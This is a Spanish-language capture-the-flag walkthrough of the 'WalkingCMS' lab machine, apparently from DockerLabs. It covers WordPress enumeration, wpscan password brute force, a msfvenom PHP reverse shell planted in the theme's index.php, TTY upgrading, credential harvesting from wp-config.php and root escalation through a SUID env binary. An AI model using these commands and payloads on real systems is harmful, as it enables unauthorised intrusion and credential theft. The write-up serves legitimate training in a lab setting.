
<p align="center">
    <img src="../img/Pasted_image_20241208215736.png" width="500">
</p>

Vamos a realizar la máquina **WalkingCMS** de nivel fácil que simula un entorno real con diversas vulnerabilidades comunes en aplicaciones web, como las construidas con CMS, en este caso con el gestor de contenidos **Wordpress**.

---


## Reconocimiento inicial


Empezaremos realizando un ping a la máquina para verificar su correcto funcionamiento, al hacerlo vemos que tiene un TTL de 64, lo que significa que la máquina objetivo usa un sistema operativo Linux.

<p align="center">
    <img src="../img/Pasted_image_20241208222956.png" width="500">
</p>

---

## Enumeración


#### Escaneo de puertos


Realizamos un escaneo de puertos básico con **nmap** para identificar los puertos que están abiertos:
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241208223227.png" width="500">
</p>

Tiene solo abierto el puerto **80** (HTTP) abierto. Profundizamos con un escaneo más exhaustivo a dicho puerto.
```
nmap -p80 -sVC --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20241208223441.png" width="500">
</p>


El puerto **80** está asociado a un servidor web Apache, lo que podría ser vulnerable. Vamos a inspeccionarlo.

---

### Análisis del servidor web(puerto 80)


Al acceder al servidor web y revisar el código fuente, no encontramos nada relevante.
<p align="center">
    <img src="../img/Pasted_image_20241208223543.png" width="500">
</p>


Para explorar más, usamos **gobuster** en busca de directorios y archivos:
```
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,py,html
```




**Gobuster** encuentra una ruta `/wordpress`, que nos indica que estamos ante un **CMS  Wordpress**. Inspeccionamos la web
<p align="center">
    <img src="../img/Pasted_image_20241208223813.png" width="500">
</p>


No vemos nada relevante, pero como obtuvimos una ruta nueva, volvemos a realizar **Fuzzing Web**, con dicha ruta.
```
gobuster dir -u http://172.18.0.2\wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,py,html
```
<p align="center">
    <img src="../img/Pasted_image_20241208224038.png" width="500">
</p>


Nos enumera otra serie de ruta o directorios, de los cuales, el más relevante es `wp-admin`. Inspeccionamos la ruta, que será un **login** para entrar al panel de administración del Wordpress.
<p align="center">
    <img src="../img/Pasted_image_20241208224204.png" width="500">
</p>


Como no tenemos credenciales válida, vamos a realizar un ataque de fuerza bruta para poder identificar posible usuario y contraseña.

---

#### Enumerar usuario

Vamos a usar la herramienta **wpscan** para intentar encontrar algún usuario válido.
```
wpscan -url http://172.17.0.2/wordpress --enumerate u
```

<p align="center">
    <img src="../img/Pasted_image_20241208224558.png" width="500">
</p>
<p align="center">
    <img src="../img/Pasted_image_20241208224636.png" width="500">
</p>

Obtenemos la crendecial
- **Usuario**: mario


#### Obtener contraseña

Teniendo un nombre de usuario podemos usar de nuevo la herramienta **wpscan**, para por medio de la fuerza bruta y con la ayuda de un diccionario encontrar la contraseña para ese usuario.
```
wpscan --url http://172.17.0.2/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames mario
```
<p align="center">
    <img src="../img/Pasted_image_20241208225000.png" width="500">
</p>
<p align="center">
    <img src="../img/Pasted_image_20241208225029.png" width="500">
</p>


 **Wpscan**, encuentra la contraseña del usuario; las credenciales son:
- **Usuario**: mario
- **Contraseña**: love




Accedemos al panel de administración por medio de la ruta `wp-admin`, proporcionando en el **login**, las credenciales que encontramos

<p align="center">
    <img src="../img/Pasted_image_20241208225256.png" width="500">
</p>





Una vez introducidas las credenciales, obtenemos acceso al panel de administración
<p align="center">
    <img src="../img/Pasted_image_20241208225408.png" width="500">
</p>


---


## Explotación


Investigando un poco, tenemos un editor de temas del propio Wordpress, el cual podemos modificar alguna página para que cuando se ejecute nos proporcione un **reverse shell**, para ello:

1. Vamos a `Apariencia/Theme Code Editor` y ahí encontramos la estructura de archivos del **CMS**
<p align="center">
    <img src="../img/Pasted_image_20241208225712.png" width="500">
</p>


2. El primer código que vemos es de la página **index.php**, la idea es borrar todo el código e introducir una **reverse shell** y así poder obtener una *RCE*. Vamos a generar un código malicioso con **msfvenom**.
```
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=1234 -f raw > pwned.php
```
<p align="center">
    <img src="../img/Pasted_image_20241208230044.png" width="500">
</p>



También tenemos un `reverse shell` de *GitHub* realizada por **PentestMokey** que está en el siguiente enlace:
-  [PentestMonkey][https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php]
- El problema que me ocasionaba la primera es que después no podía tratar la *TTY*. Con la de **PentestMoneky**, si puedo realizar el tratamiento de la *TTY*



3. Copiamos el código generado y lo pegamos en la página del gestor de contenidos **index.php**.
<p align="center">
    <img src="../img/Pasted_image_20241208231247.png" width="500">
</p>


4. Nos ponemos a la escucha con la herramienta **netcat**, por el puerto especificado en el código malicioso
```
nc -nlvp 1234
```
<p align="center">
    <img src="../img/Pasted_image_20241208231310.png" width="500">
</p>

5. Tenemos que ejecutar la página **index.php**, para que cuando se cargue, ejecute el código malicioso que le introdujimos y así recibir una **reverse shell**. Para ejecutar dicha página, tenemos que recordad que las páginas de Wordpress se guardan en la ruta `/wp-content/themes/nombre_de_la_plantilla/index.php`.
<p align="center">
    <img src="../img/Pasted_image_20241208232026.png" width="500">
</p>


Si vamos a la terminal donde estamos a la escucha
<p align="center">
    <img src="../img/Pasted_image_20241209211806.png" width="500">
</p>


Obtuvimos una ejecución remota de comandos **RCE**.

---


## Post-explotación

Haremos tratamiento de la *TTY*, para no perder la conexión y tener una consola de comandos interactiva.

- Empezamos en la reverse shell obtenida
```bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@host_/$ ^Z
zsh: suspended nc -nlvp 4444
```

<p align="center">
    <img src="../img/Pasted_image_20241209211938.png" width="500">
</p>



- Ahora resetearemos la configuración de la shell que dejamos en segundo plano indicando **reset** y **xterm**
```bash
~$> stty raw -echo; fg
```
```bash
[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```
<p align="center">
    <img src="../img/Pasted_image_20241209212044.png" width="500">
</p>


Exportamos las variables de entorno **TERM** y **SHELL**
- `export TERM=xterm` -> Debemos hacer esto ya que a pesar de haberle indicado que queríamos una **xterm** al momento de reiniciarlo la variable de entorno **TERM** vale **dump** (Se usa esta variable para poder usar los atajos de teclado).
- `export SHELL=bash` -> Para que nuestra shell sea una bash.

```bash
www-data@host:/$ export TERM=xterm
www-data@host:/$ export SHELL=bash
```
<p align="center">
    <img src="../img/Pasted_image_20241209212118.png" width="500">
</p>


Ya con esto hecho tendríamos una **TTY** full interactiva, pero falta una cosa para que sea lo más cómoda posible, cambiar las filas y columnas, esto para poder ocupar toda nuestra pantalla ya que en este momento solo podemos usar una porción de esta

Vemos el tamaño de la shell de la máquina victima
```
stty size
```

<p align="center">
    <img src="../img/Pasted_image_20241209212233.png" width="500">
</p>


Vemos el tamaño de nuestra shell en una consola normal

```bash
~$> stty size
46 207
```

<p align="center">
    <img src="../img/Pasted_image_20241209212313.png" width="500">
</p>



Y las seteamos en la reverse shell **(en mi caso 40 filas y 123 columnas)**

```bash
www-data@host:/$ stty rows 46 columns 207
```

<p align="center">
    <img src="../img/Pasted_image_20241209212401.png" width="500">
</p>


Y listo!, ya podemos disfrutar de una shell totalmente interactiva y muy comoda para continuar rompiendo



### Elevar Privilegios

Enumerando el sistema, encuentro en la ruta `/var/www/html/wordpress`, el fichero `wp-config.php`, este fichero contiene información sobre la base de datos.
```
cat /var/www/html/wordpress/wp-config.php
```

<p align="center">
    <img src="../img/Pasted_image_20241209212758.png" width="500">
</p>

Las credenciales que nos da el fichero son:
- **Usuario**: wordpressuser
- **Contraseña**: t9sH76gpQ82UFeZ3GXZS


Obtenemos el nombre de la base de datos, el usuario y su contraseña. Por lo que podemos entrar a la base de datos y seguir enumerando.
```
mysql -u wordpressuser -p
```

<p align="center">
    <img src="../img/Pasted_image_20241209213513.png" width="500">
</p>

Lo que tenemos que hacer es enumerar toda la información de la base de datos.

- #### Listamos las bases de datos
```
show databases;
```

<p align="center">
    <img src="../img/Pasted_image_20241209213635.png" width="500">
</p>
- #### Entramos en la base de datos
```
use wordpress
```

<p align="center">
    <img src="../img/Pasted_image_20241209213738.png" width="500">
</p>

- #### Mostramos las tablas
```
show tables;
```

<p align="center">
    <img src="../img/Pasted_image_20241209213827.png" width="500">
</p>

- #### Enumeramos columnas de la tabla (`wp-users`)
```
show columns from wp_users;
```

<p align="center">
    <img src="../img/Pasted_image_20241209214925.png" width="500">
</p>


- #### Mostrar todos los datos de la tabla
```
SELECT * FROM wp_users;
```

<p align="center">
    <img src="../img/Pasted_image_20241209215112.png" width="500">
</p>

Encontramos otras credenciales:
- **Usuario**: mario
- **Contraseña**: $\$P\$BY6kFWTZS3vFL/FZzkguuRbzjeamvY0$

Pero no tenemos ningún usuario creado llamado **mario**, así que por aquí no va la escalada de privilegios.


### SUID
Vamos a buscar binarios que tengan permisos `SUID`.
```
find / -perm -4000 2>/dev/null
```

<p align="center">
    <img src="../img/Pasted_image_20241209215633.png" width="500">
</p>

El binario que me llama la atención es  `/usr/bin/env`, vamos a ejecutar ese binario con la ayuda de la herramienta **GTFObins**, que no indicará como tenemos que ejecutar el binario para obtener privilegios de `root`.

<p align="center">
    <img src="../img/Pasted_image_20241209220150.png" width="500">
</p>

Nos indica la herramienta que ejecutando el siguiente comandos podemos ser usuarios `root`:
```
/usr/bin/env /bin/sh -p
```

<p align="center">
    <img src="../img/Pasted_image_20241209220317.png" width="500">
</p>

Ya somos el usuario `root`, y ahora tenemos permisos para seguir enumerando el sistema.
```
cat /etc/passwd
```

<p align="center">
    <img src="../img/Pasted_image_20241209220453.png" width="500">
</p>

